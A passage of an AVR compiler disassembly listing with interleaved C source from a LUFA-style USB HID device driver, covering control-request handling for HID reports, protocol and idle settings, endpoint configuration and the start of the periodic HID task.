    5f08:	40 85       	ldd	r20, Z+8	; 0x08

				CALLBACK_HID_Device_CreateHIDReport(HIDInterfaceInfo, &ReportID, ReportType, ReportData, &ReportSize);

				if (HIDInterfaceInfo->Config.PrevReportINBuffer != NULL)
				{
					memcpy(HIDInterfaceInfo->Config.PrevReportINBuffer, ReportData,
    5f0a:	50 e0       	ldi	r21, 0x00	; 0
    5f0c:	b4 01       	movw	r22, r8
    5f0e:	0e 94 0c 39 	call	0x7218	; 0x7218 <memcpy>
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    5f12:	10 92 e9 00 	sts	0x00E9, r1	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    5f16:	e8 ee       	ldi	r30, 0xE8	; 232
    5f18:	f0 e0       	ldi	r31, 0x00	; 0
    5f1a:	80 81       	ld	r24, Z
    5f1c:	87 7f       	andi	r24, 0xF7	; 247
    5f1e:	80 83       	st	Z, r24

				Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);

				Endpoint_ClearSETUP();

				if (ReportID)
    5f20:	8b 81       	ldd	r24, Y+3	; 0x03
    5f22:	81 11       	cpse	r24, r1
			 *  \param[in] Data  Data to write into the the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_8(const uint8_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_8(const uint8_t Data)
			{
				UEDATX = Data;
    5f24:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
				  Endpoint_Write_8(ReportID);

				Endpoint_Write_Control_Stream_LE(ReportData, ReportSize);
    5f28:	69 81       	ldd	r22, Y+1	; 0x01
    5f2a:	7a 81       	ldd	r23, Y+2	; 0x02
    5f2c:	c4 01       	movw	r24, r8
    5f2e:	4c d4       	rcall	.+2200   	; 0x67c8 <Endpoint_Write_Control_Stream_LE>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    5f30:	e8 ee       	ldi	r30, 0xE8	; 232
    5f32:	f0 e0       	ldi	r31, 0x00	; 0
    5f34:	80 81       	ld	r24, Z
    5f36:	8b 77       	andi	r24, 0x7B	; 123
    5f38:	80 83       	st	Z, r24
    5f3a:	0f b6       	in	r0, 0x3f	; 63
    5f3c:	f8 94       	cli
    5f3e:	be be       	out	0x3e, r11	; 62
    5f40:	0f be       	out	0x3f, r0	; 63
    5f42:	ad be       	out	0x3d, r10	; 61
    5f44:	ad c0       	rjmp	.+346    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
				Endpoint_ClearOUT();
			}

			break;
		case HID_REQ_SetReport:
			if (USB_ControlRequest.bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_CLASS | REQREC_INTERFACE))
    5f46:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    5f4a:	81 32       	cpi	r24, 0x21	; 33
    5f4c:	09 f0       	breq	.+2      	; 0x5f50 <HID_Device_ProcessControlRequest+0x12a>
    5f4e:	a8 c0       	rjmp	.+336    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
			{
    5f50:	6d b6       	in	r6, 0x3d	; 61
    5f52:	7e b6       	in	r7, 0x3e	; 62
				uint16_t ReportSize = USB_ControlRequest.wLength;
    5f54:	e4 ef       	ldi	r30, 0xF4	; 244
    5f56:	fd e0       	ldi	r31, 0x0D	; 13
    5f58:	06 81       	ldd	r16, Z+6	; 0x06
    5f5a:	17 81       	ldd	r17, Z+7	; 0x07
				uint8_t  ReportID   = (USB_ControlRequest.wValue & 0xFF);
    5f5c:	42 80       	ldd	r4, Z+2	; 0x02
    5f5e:	53 80       	ldd	r5, Z+3	; 0x03
    5f60:	34 2c       	mov	r3, r4
				uint8_t  ReportType = (USB_ControlRequest.wValue >> 8) - 1;
    5f62:	5a 94       	dec	r5
				uint8_t  ReportData[ReportSize];
    5f64:	8d b7       	in	r24, 0x3d	; 61
    5f66:	9e b7       	in	r25, 0x3e	; 62
    5f68:	80 1b       	sub	r24, r16
    5f6a:	91 0b       	sbc	r25, r17
    5f6c:	0f b6       	in	r0, 0x3f	; 63
    5f6e:	f8 94       	cli
    5f70:	9e bf       	out	0x3e, r25	; 62
    5f72:	0f be       	out	0x3f, r0	; 63
    5f74:	8d bf       	out	0x3d, r24	; 61
    5f76:	ed b7       	in	r30, 0x3d	; 61
    5f78:	fe b7       	in	r31, 0x3e	; 62
    5f7a:	31 96       	adiw	r30, 0x01	; 1
    5f7c:	4f 01       	movw	r8, r30
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    5f7e:	0f 2e       	mov	r0, r31
    5f80:	f8 ee       	ldi	r31, 0xE8	; 232
    5f82:	af 2e       	mov	r10, r31
    5f84:	b1 2c       	mov	r11, r1
    5f86:	f0 2d       	mov	r31, r0
    5f88:	f5 01       	movw	r30, r10
    5f8a:	80 81       	ld	r24, Z
    5f8c:	87 7f       	andi	r24, 0xF7	; 247
    5f8e:	80 83       	st	Z, r24

				Endpoint_ClearSETUP();
				Endpoint_Read_Control_Stream_LE(ReportData, ReportSize);
    5f90:	b8 01       	movw	r22, r16
    5f92:	c4 01       	movw	r24, r8
    5f94:	81 d4       	rcall	.+2306   	; 0x6898 <Endpoint_Read_Control_Stream_LE>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    5f96:	f5 01       	movw	r30, r10
    5f98:	80 81       	ld	r24, Z
    5f9a:	8e 77       	andi	r24, 0x7E	; 126
    5f9c:	80 83       	st	Z, r24
				Endpoint_ClearIN();

				CALLBACK_HID_Device_ProcessHIDReport(HIDInterfaceInfo, ReportID, ReportType,
    5f9e:	44 20       	and	r4, r4
    5fa0:	19 f0       	breq	.+6      	; 0x5fa8 <HID_Device_ProcessControlRequest+0x182>
    5fa2:	81 e0       	ldi	r24, 0x01	; 1
    5fa4:	90 e0       	ldi	r25, 0x00	; 0
    5fa6:	02 c0       	rjmp	.+4      	; 0x5fac <HID_Device_ProcessControlRequest+0x186>
    5fa8:	80 e0       	ldi	r24, 0x00	; 0
    5faa:	90 e0       	ldi	r25, 0x00	; 0
				                                     &ReportData[ReportID ? 1 : 0], ReportSize - (ReportID ? 1 : 0));
    5fac:	21 e0       	ldi	r18, 0x01	; 1
    5fae:	30 e0       	ldi	r19, 0x00	; 0
    5fb0:	31 10       	cpse	r3, r1
    5fb2:	02 c0       	rjmp	.+4      	; 0x5fb8 <HID_Device_ProcessControlRequest+0x192>
    5fb4:	20 e0       	ldi	r18, 0x00	; 0
    5fb6:	30 e0       	ldi	r19, 0x00	; 0
    5fb8:	28 0d       	add	r18, r8
    5fba:	39 1d       	adc	r19, r9

				Endpoint_ClearSETUP();
				Endpoint_Read_Control_Stream_LE(ReportData, ReportSize);
				Endpoint_ClearIN();

				CALLBACK_HID_Device_ProcessHIDReport(HIDInterfaceInfo, ReportID, ReportType,
    5fbc:	08 1b       	sub	r16, r24
    5fbe:	19 0b       	sbc	r17, r25
    5fc0:	45 2d       	mov	r20, r5
    5fc2:	64 2d       	mov	r22, r4
    5fc4:	c6 01       	movw	r24, r12
    5fc6:	0e 94 53 1e 	call	0x3ca6	; 0x3ca6 <CALLBACK_HID_Device_ProcessHIDReport>
    5fca:	0f b6       	in	r0, 0x3f	; 63
    5fcc:	f8 94       	cli
    5fce:	7e be       	out	0x3e, r7	; 62
    5fd0:	0f be       	out	0x3f, r0	; 63
    5fd2:	6d be       	out	0x3d, r6	; 61
    5fd4:	65 c0       	rjmp	.+202    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
				                                     &ReportData[ReportID ? 1 : 0], ReportSize - (ReportID ? 1 : 0));
			}

			break;
		case HID_REQ_GetProtocol:
			if (USB_ControlRequest.bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_CLASS | REQREC_INTERFACE))
    5fd6:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    5fda:	81 3a       	cpi	r24, 0xA1	; 161
    5fdc:	09 f0       	breq	.+2      	; 0x5fe0 <HID_Device_ProcessControlRequest+0x1ba>
    5fde:	60 c0       	rjmp	.+192    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    5fe0:	e8 ee       	ldi	r30, 0xE8	; 232
    5fe2:	f0 e0       	ldi	r31, 0x00	; 0
    5fe4:	80 81       	ld	r24, Z
    5fe6:	87 7f       	andi	r24, 0xF7	; 247
    5fe8:	80 83       	st	Z, r24
			 *  \return Boolean \c true if the current endpoint is ready for an IN packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsINReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsINReady(void)
			{
				return ((UEINTX & (1 << TXINI)) ? true : false);
    5fea:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
			{
				Endpoint_ClearSETUP();
				while (!(Endpoint_IsINReady()));
    5fee:	80 ff       	sbrs	r24, 0
    5ff0:	fc cf       	rjmp	.-8      	; 0x5fea <HID_Device_ProcessControlRequest+0x1c4>
				Endpoint_Write_8(HIDInterfaceInfo->State.UsingReportProtocol);
    5ff2:	f6 01       	movw	r30, r12
    5ff4:	81 85       	ldd	r24, Z+9	; 0x09
			 *  \param[in] Data  Data to write into the the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_8(const uint8_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_8(const uint8_t Data)
			{
				UEDATX = Data;
    5ff6:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    5ffa:	e8 ee       	ldi	r30, 0xE8	; 232
    5ffc:	f0 e0       	ldi	r31, 0x00	; 0
    5ffe:	80 81       	ld	r24, Z
    6000:	8e 77       	andi	r24, 0x7E	; 126
				Endpoint_ClearIN();
				Endpoint_ClearStatusStage();
    6002:	80 83       	st	Z, r24
    6004:	0a d5       	rcall	.+2580   	; 0x6a1a <Endpoint_ClearStatusStage>
    6006:	4c c0       	rjmp	.+152    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
			}

			break;
		case HID_REQ_SetProtocol:
			if (USB_ControlRequest.bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_CLASS | REQREC_INTERFACE))
    6008:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    600c:	81 32       	cpi	r24, 0x21	; 33
    600e:	09 f0       	breq	.+2      	; 0x6012 <HID_Device_ProcessControlRequest+0x1ec>
    6010:	47 c0       	rjmp	.+142    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    6012:	e8 ee       	ldi	r30, 0xE8	; 232
    6014:	f0 e0       	ldi	r31, 0x00	; 0
    6016:	80 81       	ld	r24, Z
    6018:	87 7f       	andi	r24, 0xF7	; 247
			{
				Endpoint_ClearSETUP();
				Endpoint_ClearStatusStage();
    601a:	80 83       	st	Z, r24
    601c:	fe d4       	rcall	.+2556   	; 0x6a1a <Endpoint_ClearStatusStage>

				HIDInterfaceInfo->State.UsingReportProtocol = ((USB_ControlRequest.wValue & 0xFF) != 0x00);
    601e:	90 91 f6 0d 	lds	r25, 0x0DF6	; 0x800df6 <USB_ControlRequest+0x2>
    6022:	81 e0       	ldi	r24, 0x01	; 1
    6024:	91 11       	cpse	r25, r1
    6026:	01 c0       	rjmp	.+2      	; 0x602a <HID_Device_ProcessControlRequest+0x204>
    6028:	80 e0       	ldi	r24, 0x00	; 0
    602a:	f6 01       	movw	r30, r12
    602c:	81 87       	std	Z+9, r24	; 0x09
    602e:	38 c0       	rjmp	.+112    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
			}

			break;
		case HID_REQ_SetIdle:
			if (USB_ControlRequest.bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_CLASS | REQREC_INTERFACE))
    6030:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    6034:	81 32       	cpi	r24, 0x21	; 33
    6036:	a1 f5       	brne	.+104    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
    6038:	e8 ee       	ldi	r30, 0xE8	; 232
    603a:	f0 e0       	ldi	r31, 0x00	; 0
    603c:	80 81       	ld	r24, Z
    603e:	87 7f       	andi	r24, 0xF7	; 247
			{
				Endpoint_ClearSETUP();
				Endpoint_ClearStatusStage();
    6040:	80 83       	st	Z, r24
    6042:	eb d4       	rcall	.+2518   	; 0x6a1a <Endpoint_ClearStatusStage>

				HIDInterfaceInfo->State.IdleCount = ((USB_ControlRequest.wValue & 0xFF00) >> 6);
    6044:	80 91 f6 0d 	lds	r24, 0x0DF6	; 0x800df6 <USB_ControlRequest+0x2>
    6048:	90 91 f7 0d 	lds	r25, 0x0DF7	; 0x800df7 <USB_ControlRequest+0x3>
    604c:	88 27       	eor	r24, r24
    604e:	00 24       	eor	r0, r0
    6050:	88 0f       	add	r24, r24
    6052:	99 1f       	adc	r25, r25
    6054:	00 1c       	adc	r0, r0
    6056:	88 0f       	add	r24, r24
    6058:	99 1f       	adc	r25, r25
    605a:	00 1c       	adc	r0, r0
    605c:	89 2f       	mov	r24, r25
    605e:	90 2d       	mov	r25, r0
    6060:	f6 01       	movw	r30, r12
    6062:	95 87       	std	Z+13, r25	; 0x0d
    6064:	84 87       	std	Z+12, r24	; 0x0c
    6066:	1c c0       	rjmp	.+56     	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
			}

			break;
		case HID_REQ_GetIdle:
			if (USB_ControlRequest.bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_CLASS | REQREC_INTERFACE))
    6068:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    606c:	81 3a       	cpi	r24, 0xA1	; 161
    606e:	c1 f4       	brne	.+48     	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
    6070:	e8 ee       	ldi	r30, 0xE8	; 232
    6072:	f0 e0       	ldi	r31, 0x00	; 0
    6074:	80 81       	ld	r24, Z
    6076:	87 7f       	andi	r24, 0xF7	; 247
    6078:	80 83       	st	Z, r24
			 *  \return Boolean \c true if the current endpoint is ready for an IN packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsINReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsINReady(void)
			{
				return ((UEINTX & (1 << TXINI)) ? true : false);
    607a:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
			{
				Endpoint_ClearSETUP();
				while (!(Endpoint_IsINReady()));
    607e:	80 ff       	sbrs	r24, 0
    6080:	fc cf       	rjmp	.-8      	; 0x607a <HID_Device_ProcessControlRequest+0x254>
				Endpoint_Write_8(HIDInterfaceInfo->State.IdleCount >> 2);
    6082:	f6 01       	movw	r30, r12
    6084:	84 85       	ldd	r24, Z+12	; 0x0c
    6086:	95 85       	ldd	r25, Z+13	; 0x0d
    6088:	96 95       	lsr	r25
    608a:	87 95       	ror	r24
    608c:	96 95       	lsr	r25
    608e:	87 95       	ror	r24
			 *  \param[in] Data  Data to write into the the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_8(const uint8_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_8(const uint8_t Data)
			{
				UEDATX = Data;
    6090:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    6094:	e8 ee       	ldi	r30, 0xE8	; 232
    6096:	f0 e0       	ldi	r31, 0x00	; 0
    6098:	80 81       	ld	r24, Z
    609a:	8e 77       	andi	r24, 0x7E	; 126
				Endpoint_ClearIN();
				Endpoint_ClearStatusStage();
    609c:	80 83       	st	Z, r24
    609e:	bd d4       	rcall	.+2426   	; 0x6a1a <Endpoint_ClearStatusStage>
			}

			break;
	}
}
    60a0:	0f b6       	in	r0, 0x3f	; 63
    60a2:	f8 94       	cli
    60a4:	fe be       	out	0x3e, r15	; 62
    60a6:	0f be       	out	0x3f, r0	; 63
    60a8:	ed be       	out	0x3d, r14	; 61
    60aa:	0f 90       	pop	r0
    60ac:	0f 90       	pop	r0
    60ae:	0f 90       	pop	r0
    60b0:	df 91       	pop	r29
    60b2:	cf 91       	pop	r28
    60b4:	1f 91       	pop	r17
    60b6:	0f 91       	pop	r16
    60b8:	ff 90       	pop	r15
    60ba:	ef 90       	pop	r14
    60bc:	df 90       	pop	r13
    60be:	cf 90       	pop	r12
    60c0:	bf 90       	pop	r11
    60c2:	af 90       	pop	r10
    60c4:	9f 90       	pop	r9
    60c6:	8f 90       	pop	r8
    60c8:	7f 90       	pop	r7
    60ca:	6f 90       	pop	r6
    60cc:	5f 90       	pop	r5
    60ce:	4f 90       	pop	r4
    60d0:	3f 90       	pop	r3
    60d2:	08 95       	ret

000060d4 <HID_Device_ConfigureEndpoints>:

bool HID_Device_ConfigureEndpoints(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
{
	memset(&HIDInterfaceInfo->State, 0x00, sizeof(HIDInterfaceInfo->State));
    60d4:	fc 01       	movw	r30, r24
    60d6:	39 96       	adiw	r30, 0x09	; 9
    60d8:	27 e0       	ldi	r18, 0x07	; 7
    60da:	df 01       	movw	r26, r30
    60dc:	1d 92       	st	X+, r1
    60de:	2a 95       	dec	r18
    60e0:	e9 f7       	brne	.-6      	; 0x60dc <HID_Device_ConfigureEndpoints+0x8>
	HIDInterfaceInfo->State.UsingReportProtocol = true;
    60e2:	21 e0       	ldi	r18, 0x01	; 1
    60e4:	fc 01       	movw	r30, r24
    60e6:	21 87       	std	Z+9, r18	; 0x09
	HIDInterfaceInfo->State.IdleCount           = 500;
    60e8:	24 ef       	ldi	r18, 0xF4	; 244
    60ea:	31 e0       	ldi	r19, 0x01	; 1
    60ec:	35 87       	std	Z+13, r19	; 0x0d
    60ee:	24 87       	std	Z+12, r18	; 0x0c

	HIDInterfaceInfo->Config.ReportINEndpoint.Type = EP_TYPE_INTERRUPT;
    60f0:	23 e0       	ldi	r18, 0x03	; 3
    60f2:	24 83       	std	Z+4, r18	; 0x04

	if (!(Endpoint_ConfigureEndpointTable(&HIDInterfaceInfo->Config.ReportINEndpoint, 1)))
    60f4:	61 e0       	ldi	r22, 0x01	; 1
    60f6:	01 96       	adiw	r24, 0x01	; 1
    60f8:	4a c4       	rjmp	.+2196   	; 0x698e <Endpoint_ConfigureEndpointTable>
	  return false;

	return true;
}
    60fa:	08 95       	ret

000060fc <HID_Device_USBTask>:

void HID_Device_USBTask(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
{
    60fc:	5f 92       	push	r5
    60fe:	6f 92       	push	r6
    6100:	7f 92       	push	r7
    6102:	8f 92       	push	r8
    6104:	9f 92       	push	r9
    6106:	af 92       	push	r10
    6108:	bf 92       	push	r11
    610a:	cf 92       	push	r12
    610c:	df 92       	push	r13
    610e:	ef 92       	push	r14
    6110:	ff 92       	push	r15
    6112:	0f 93       	push	r16
    6114:	1f 93       	push	r17
    6116:	cf 93       	push	r28
    6118:	df 93       	push	r29
    611a:	00 d0       	rcall	.+0      	; 0x611c <HID_Device_USBTask+0x20>
    611c:	1f 92       	push	r1
    611e:	cd b7       	in	r28, 0x3d	; 61
    6120:	de b7       	in	r29, 0x3e	; 62
    6122:	7c 01       	movw	r14, r24
			Endpoint_ClearIN();
		}

		HIDInterfaceInfo->State.PrevFrameNum = USB_Device_GetFrameNumber();
	}
}
    6124:	ad b6       	in	r10, 0x3d	; 61
    6126:	be b6       	in	r11, 0x3e	; 62
	return true;
}

void HID_Device_USBTask(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
{
	if (USB_DeviceState != DEVICE_STATE_Configured)
    6128:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>
    612c:	84 30       	cpi	r24, 0x04	; 4
    612e:	09 f0       	breq	.+2      	; 0x6132 <HID_Device_USBTask+0x36>
    6130:	90 c0       	rjmp	.+288    	; 0x6252 <HID_Device_USBTask+0x156>
	  return;

	if (HIDInterfaceInfo->State.PrevFrameNum == USB_Device_GetFrameNumber())
    6132:	f7 01       	movw	r30, r14
    6134:	22 85       	ldd	r18, Z+10	; 0x0a
    6136:	33 85       	ldd	r19, Z+11	; 0x0b
			 *  \return Current USB frame number from the USB controller.
			 */
			static inline uint16_t USB_Device_GetFrameNumber(void) ATTR_ALWAYS_INLINE ATTR_WARN_UNUSED_RESULT;
			static inline uint16_t USB_Device_GetFrameNumber(void)
			{
				return UDFNUM;
    6138:	80 91 e4 00 	lds	r24, 0x00E4	; 0x8000e4 <__TEXT_REGION_LENGTH__+0x7e00e4>
    613c:	90 91 e5 00 	lds	r25, 0x00E5	; 0x8000e5 <__TEXT_REGION_LENGTH__+0x7e00e5>
    6140:	28 17       	cp	r18, r24
    6142:	39 07       	cpc	r19, r25
    6144:	09 f4       	brne	.+2      	; 0x6148 <HID_Device_USBTask+0x4c>
    6146:	85 c0       	rjmp	.+266    	; 0x6252 <HID_Device_USBTask+0x156>
		#else
		return;
		#endif
	}

	Endpoint_SelectEndpoint(HIDInterfaceInfo->Config.ReportINEndpoint.Address);
    6148:	81 81       	ldd	r24, Z+1	; 0x01
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    614a:	8f 70       	andi	r24, 0x0F	; 15
    614c:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
			 *          on its direction.
			 */
			static inline bool Endpoint_IsReadWriteAllowed(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsReadWriteAllowed(void)
			{
				return ((UEINTX & (1 << RWAL)) ? true : false);
    6150:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>

	if (Endpoint_IsReadWriteAllowed())
    6154:	85 ff       	sbrs	r24, 5
    6156:	7d c0       	rjmp	.+250    	; 0x6252 <HID_Device_USBTask+0x156>
	{
    6158:	8d b6       	in	r8, 0x3d	; 61
    615a:	9e b6       	in	r9, 0x3e	; 62
		uint8_t  ReportINData[HIDInterfaceInfo->Config.PrevReportINBufferSize];
    615c:	40 85       	ldd	r20, Z+8	; 0x08
    615e:	50 e0       	ldi	r21, 0x00	; 0
    6160:	8d b7       	in	r24, 0x3d	; 61
    6162:	9e b7       	in	r25, 0x3e	; 62
    6164:	84 1b       	sub	r24, r20
    6166:	95 0b       	sbc	r25, r21
    6168:	0f b6       	in	r0, 0x3f	; 63
    616a:	f8 94       	cli
    616c:	9e bf       	out	0x3e, r25	; 62
    616e:	0f be       	out	0x3f, r0	; 63
    6170:	8d bf       	out	0x3d, r24	; 61
    6172:	ed b7       	in	r30, 0x3d	; 61
    6174:	fe b7       	in	r31, 0x3e	; 62
    6176:	31 96       	adiw	r30, 0x01	; 1
    6178:	6f 01       	movw	r12, r30
		uint8_t  ReportID     = 0;
    617a:	1b 82       	std	Y+3, r1	; 0x03
		uint16_t ReportINSize = 0;
    617c:	1a 82       	std	Y+2, r1	; 0x02
    617e:	19 82       	std	Y+1, r1	; 0x01

		memset(ReportINData, 0, sizeof(ReportINData));
    6180:	60 e0       	ldi	r22, 0x00	; 0
    6182:	70 e0       	ldi	r23, 0x00	; 0
    6184:	cf 01       	movw	r24, r30
    6186:	0e 94 15 39 	call	0x722a	; 0x722a <memset>

		bool ForceSend         = CALLBACK_HID_Device_CreateHIDReport(HIDInterfaceInfo, &ReportID, HID_REPORT_ITEM_In,
    618a:	8e 01       	movw	r16, r28
    618c:	0f 5f       	subi	r16, 0xFF	; 255
    618e:	1f 4f       	sbci	r17, 0xFF	; 255
    6190:	96 01       	movw	r18, r12
    6192:	40 e0       	ldi	r20, 0x00	; 0
    6194:	be 01       	movw	r22, r28
    6196:	6d 5f       	subi	r22, 0xFD	; 253
    6198:	7f 4f       	sbci	r23, 0xFF	; 255
    619a:	c7 01       	movw	r24, r14
    619c:	0e 94 5c 1d 	call	0x3ab8	; 0x3ab8 <CALLBACK_HID_Device_CreateHIDReport>
    61a0:	68 2e       	mov	r6, r24
		                                                             ReportINData, &ReportINSize);
		bool StatesChanged     = false;
		bool IdlePeriodElapsed = (HIDInterfaceInfo->State.IdleCount && !(HIDInterfaceInfo->State.IdleMSRemaining));
    61a2:	f7 01       	movw	r30, r14
    61a4:	84 85       	ldd	r24, Z+12	; 0x0c
    61a6:	95 85       	ldd	r25, Z+13	; 0x0d
    61a8:	89 2b       	or	r24, r25
    61aa:	31 f0       	breq	.+12     	; 0x61b8 <HID_Device_USBTask+0xbc>
    61ac:	86 85       	ldd	r24, Z+14	; 0x0e
    61ae:	97 85       	ldd	r25, Z+15	; 0x0f
    61b0:	89 2b       	or	r24, r25
    61b2:	21 f0       	breq	.+8      	; 0x61bc <HID_Device_USBTask+0xc0>
    61b4:	80 e0       	ldi	r24, 0x00	; 0
    61b6:	03 c0       	rjmp	.+6      	; 0x61be <HID_Device_USBTask+0xc2>
    61b8:	80 e0       	ldi	r24, 0x00	; 0
    61ba:	01 c0       	rjmp	.+2      	; 0x61be <HID_Device_USBTask+0xc2>
    61bc:	81 e0       	ldi	r24, 0x01	; 1
    61be:	81 70       	andi	r24, 0x01	; 1
    61c0:	78 2e       	mov	r7, r24

		if (HIDInterfaceInfo->Config.PrevReportINBuffer != NULL)
    61c2:	f7 01       	movw	r30, r14
    61c4:	06 81       	ldd	r16, Z+6	; 0x06
    61c6:	17 81       	ldd	r17, Z+7	; 0x07
    61c8:	01 15       	cp	r16, r1
    61ca:	11 05       	cpc	r17, r1
    61cc:	99 f0       	breq	.+38     	; 0x61f4 <HID_Device_USBTask+0xf8>
		{
			StatesChanged = (memcmp(ReportINData, HIDInterfaceInfo->Config.PrevReportINBuffer, ReportINSize) != 0);
    61ce:	49 81       	ldd	r20, Y+1	; 0x01
    61d0:	5a 81       	ldd	r21, Y+2	; 0x02
    61d2:	b8 01       	movw	r22, r16
    61d4:	c6 01       	movw	r24, r12
    61d6:	0e 94 ff 38 	call	0x71fe	; 0x71fe <memcmp>
    61da:	55 24       	eor	r5, r5
    61dc:	53 94       	inc	r5
    61de:	89 2b       	or	r24, r25
    61e0:	09 f4       	brne	.+2      	; 0x61e4 <HID_Device_USBTask+0xe8>
    61e2:	51 2c       	mov	r5, r1
			memcpy(HIDInterfaceInfo->Config.PrevReportINBuffer, ReportINData, HIDInterfaceInfo->Config.PrevReportINBufferSize);
    61e4:	f7 01       	movw	r30, r14
    61e6:	40 85       	ldd	r20, Z+8	; 0x08
    61e8:	50 e0       	ldi	r21, 0x00	; 0
    61ea:	b6 01       	movw	r22, r12
    61ec:	c8 01       	movw	r24, r16
    61ee:	0e 94 0c 39 	call	0x7218	; 0x7218 <memcpy>
    61f2:	01 c0       	rjmp	.+2      	; 0x61f6 <HID_Device_USBTask+0xfa>

		memset(ReportINData, 0, sizeof(ReportINData));

		bool ForceSend         = CALLBACK_HID_Device_CreateHIDReport(HIDInterfaceInfo, &ReportID, HID_REPORT_ITEM_In,
		                                                             ReportINData, &ReportINSize);
		bool StatesChanged     = false;
    61f4:	51 2c       	mov	r5, r1
		{
			StatesChanged = (memcmp(ReportINData, HIDInterfaceInfo->Config.PrevReportINBuffer, ReportINSize) != 0);
			memcpy(HIDInterfaceInfo->Config.PrevReportINBuffer, ReportINData, HIDInterfaceInfo->Config.PrevReportINBufferSize);
		}

